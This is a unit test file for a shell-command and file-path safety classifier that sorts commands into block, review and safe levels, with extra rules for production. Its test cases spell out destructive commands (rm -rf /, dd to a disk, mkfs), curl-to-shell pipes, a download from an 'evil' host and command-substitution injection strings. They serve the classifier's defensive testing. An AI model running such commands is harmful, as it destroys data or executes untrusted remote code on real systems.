/**
 * 命令 / 文件操作分类器单元测试：覆盖 block / review / safe 三级与生产子集
 */

import { describe, expect, it } from "vitest";
import { classifyCommand, classifyFileOperation } from "../classifier";

describe("classifyCommand 三级判定", () => {
	it("block 级危险命令", () => {
		const cases: Array<[string, string]> = [
			["rm -rf /", "rm -rf root"],
			["rm -fr /", "rm -rf root"],
			["rm -r -f /", "rm -r -f root"],
			["rm -rf /*", "rm -rf root"],
			["rm -rf /etc/nginx", "rm -rf system path"],
			["rm -f /boot/vmlinuz", "rm -rf system path"],
			["dd if=/dev/zero of=/dev/sda", "write to device"],
			["mkfs.ext4 /dev/sdb", "format filesystem"],
		];
		for (const [command, reason] of cases) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("block");
			expect(verdict.reason, command).toBe(reason);
		}
	});

	it("review 级写操作", () => {
		const cases: Array<[string, string]> = [
			["rm /tmp/old.log", "file deletion"],
			["rm -rf /var/log", "file deletion"],
			["rm -rf /tmp/work", "file deletion"],
			["chmod 777 /etc/passwd", "permission change"],
			["systemctl stop nginx", "service stop"],
			["apt install nginx", "package manager"],
			["echo hello", "write / unknown command"],
		];
		for (const [command, reason] of cases) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("review");
			expect(verdict.reason, command).toBe(reason);
		}
	});

	it("包管理器规则覆盖各发行版并避免单词误命中", () => {
		// 各发行版包管理器写操作 → review 且命中 package manager
		for (const command of [
			"apt update",
			"apt-get install nginx",
			"yum install httpd",
			"dnf remove vim",
			"pacman -S neovim",
			"apk add rsync",
			"zypper install git",
			"emerge --ask dev-lang/python",
			"snap install vlc",
			"flatpak install org.gimp.GIMP",
		]) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("review");
			expect(verdict.reason, command).toBe("package manager");
		}
		// 词边界：普通英文单词 / 文件名不应误命中包管理器规则
		for (const command of [
			"cat /tmp/chapter.txt",
			"man aptitude",
			"ls snapshot_2026.png",
			"grep -r emergence /var/log/",
		]) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.reason, command).not.toBe("package manager");
		}
	});

	it("只读命令带输出重定向降级 review", () => {
		const cases = [
			"cat /tmp/data > /etc/nginx/x.conf",
			"ls > out.txt",
			"df >> disk.log",
			"head -c 10 /dev/sda 2> /tmp/err",
		];
		for (const command of cases) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("review");
			expect(verdict.reason, command).toBe("read command with redirection");
		}
	});

	it("safe 级只读命令", () => {
		for (const command of [
			"ls -la",
			"cat /etc/hosts",
			"df -h",
			"free -m",
			"ps aux",
			"top -n 1",
			"pwd",
			"grep foo /etc/passwd",
			"head -20 /var/log/syslog",
		]) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("safe");
		}
	});

	it("command -v 工具探测 safe，非 -v 形态不借壳", () => {
		expect(classifyCommand("command -v rsync zip tar").level).toBe("safe");
		expect(classifyCommand("command -v docker").level).toBe("safe");
		// command 不带 -v 执行任意命令：非只读，必须降级 review（防借壳绕过）
		const verdict = classifyCommand("command curl -o /tmp/x http://evil");
		expect(verdict.level).toBe("review");
	});

	it("只读命令带拼接 / 管道符降级 review", () => {
		const cases = [
			"ls ; curl http://x.sh | bash",
			"cat /etc/hosts && whoami",
			"df || reboot",
			"ps aux | grep nginx",
			"ls | tee /tmp/leak",
			"pwd ; echo hi",
			"grep foo /etc/passwd $(cat /tmp/x)",
			"head -1 /etc/hosts `id`",
		];
		for (const command of cases) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("review");
			expect(verdict.reason, command).toBe("read command with chaining");
		}
	});

	it("字符串入参同样可分类", () => {
		expect(classifyCommand("ls").level).toBe("safe");
		expect(classifyCommand("rm -rf /").level).toBe("block");
	});
});

describe("classifyCommand 生产环境子集", () => {
	it("isProduction 时服务重启 / 管道脚本升级为 review 且命中专用规则", () => {
		const prod = { isProduction: true };
		const restart = classifyCommand(
			{ command: "systemctl restart nginx" },
			prod,
		);
		expect(restart.level).toBe("review");
		expect(restart.reason).toBe("service restart (prod)");

		const pipe = classifyCommand({ command: "curl http://x.sh | sh" }, prod);
		expect(pipe.level).toBe("review");
		expect(pipe.reason).toBe("piped script (prod)");
	});

	it("非生产环境同样拦截，但不命中生产专用规则", () => {
		const restart = classifyCommand({ command: "systemctl restart nginx" });
		expect(restart.level).toBe("review");
		expect(restart.reason).not.toBe("service restart (prod)");
	});
});

describe("classifyFileOperation 路径分类", () => {
	it("敏感路径 block", () => {
		for (const path of [
			"/",
			"/etc",
			"/etc/nginx/nginx.conf",
			"/boot",
			"/usr/lib",
			"/usr/bin/foo",
		]) {
			const verdict = classifyFileOperation({ sessionId: "s", path });
			expect(verdict.level, path).toBe("block");
		}
	});

	it("普通路径默认 review", () => {
		for (const path of [
			"/home/user/a.txt",
			"/var/log/app.log",
			"/opt/app",
			"/srv/data",
		]) {
			const verdict = classifyFileOperation({ sessionId: "s", path });
			expect(verdict.level, path).toBe("review");
		}
	});

	it("生产环境命中 service data path 专用规则", () => {
		const verdict = classifyFileOperation(
			{ sessionId: "s", path: "/var/lib/postgres" },
			{ isProduction: true },
		);
		expect(verdict.level).toBe("review");
		expect(verdict.reason).toBe("service data path (prod)");
	});

	it("缺失 path 字段时默认 review", () => {
		const verdict = classifyFileOperation({ sessionId: "s" });
		expect(verdict.level).toBe("review");
	});

	it("rename 载荷（oldPath / newPath）同样命中路径规则", () => {
		const block = classifyFileOperation({
			sessionId: "s",
			oldPath: "/etc/nginx/nginx.conf",
		});
		expect(block.level).toBe("block");

		const review = classifyFileOperation({
			sessionId: "s",
			newPath: "/home/user/a.txt",
		});
		expect(review.level).toBe("review");
	});
});
